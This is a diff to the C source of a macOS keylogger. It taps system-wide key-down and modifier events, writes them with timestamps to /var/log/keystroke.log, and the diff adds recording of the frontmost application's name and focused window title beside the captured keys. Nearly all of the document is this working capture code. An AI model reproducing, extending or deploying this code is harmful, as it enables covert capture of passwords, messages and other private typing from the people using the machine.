@@ -1,17 +1,22 @@
 #include <stdio.h>
 #include <time.h>
 #include <ApplicationServices/ApplicationServices.h> /* ApplicationServices.framework needed */
+#include <objc/objc.h>
+#include <objc/objc-runtime.h>
+#include <CoreFoundation/CoreFoundation.h>
+
 
 FILE *logFile = NULL;
 int counter = 0;
 time_t lastTime;
+id activeProcess;
 
 char* keyCodeToReadableString (CGKeyCode);
 CGEventRef myCGEventCallback (CGEventTapProxy, CGEventType, CGEventRef, void *);
 
 int main (int argc, const char * argv[]) {
   CGEventFlags oldFlags = CGEventSourceFlagsState(kCGEventSourceStateCombinedSessionState);
-
+  // kEventAppFrontSwitched
   CGEventMask eventMask = (CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged));
   CFMachPortRef eventTap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, 0, eventMask, myCGEventCallback, &oldFlags);
   
@@ -23,27 +28,63 @@ int main (int argc, const char * argv[]) {
   CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
   CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
   CGEventTapEnable(eventTap, true);
-  
+
+
   logFile = fopen("/var/log/keystroke.log", "a");
   CFRunLoopRun();
   
   return 0;
 }
 
+id getActiveProcess(){
+    id workspace  = objc_msgSend(objc_getClass("NSWorkspace"), sel_registerName("sharedWorkspace"));
+    id app = objc_msgSend(workspace , sel_registerName("frontmostApplication"));
+    return app;
+}
+
+
+CFStringRef getWindowTitleOfProcess(id app){
+    pid_t pid = objc_msgSend(app, sel_registerName("processIdentifier"));    
+
+
+
+    AXUIElementRef appElem = AXUIElementCreateApplication(pid);
+    AXUIElementRef window = NULL;
+    AXUIElementCopyAttributeValue(appElem, kAXFocusedWindowAttribute, (CFTypeRef*)&window);
+
+    CFStringRef title = NULL;
+    AXError result = AXUIElementCopyAttributeValue(window, kAXTitleAttribute,
+                   (CFTypeRef*)&title);
+
+    CFRelease(window);
+    CFRelease(appElem);
+
+    CFStringRef name = (CFStringRef) objc_msgSend(app, sel_registerName("localizedName"));
+
+    return CFStringCreateWithFormat(NULL, NULL, CFSTR("### %@ \t\t $%@"), name, title);
+}
 
 CGEventRef myCGEventCallback (CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
   if ((type != kCGEventKeyDown) && (type != kCGEventFlagsChanged)) {
     return event;
   }
-  
+
   counter++;
   CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
-  
+
   if (logFile) {
     time_t currentTime;
     time(&currentTime);
 
-    if(currentTime - lastTime > 5){
+    if(currentTime - lastTime > 2){
+        id app = getActiveProcess();
+        if(app != activeProcess){
+            CFStringRef title = getWindowTitleOfProcess(app);        
+            CFStringEncoding encodingMethod = CFStringGetSystemEncoding();
+            fprintf(logFile, "\n%s", CFStringGetCStringPtr(title, encodingMethod));
+            CFRelease(title);
+            activeProcess = app;
+        }
         struct tm *time_info = localtime(&currentTime);
         char fmtTime[32];
         strftime(fmtTime, 32, "%F %T", time_info);
@@ -52,7 +93,8 @@ CGEventRef myCGEventCallback (CGEventTapProxy proxy, CGEventType type, CGEventRe
         fprintf(logFile, "%s", keyCodeToReadableString(keyCode));
     }
     
-    if (counter % 50 == 0) fflush(logFile);
+    if (counter % 100 == 0) 
+        fflush(logFile);
 
     time(&lastTime);
   }
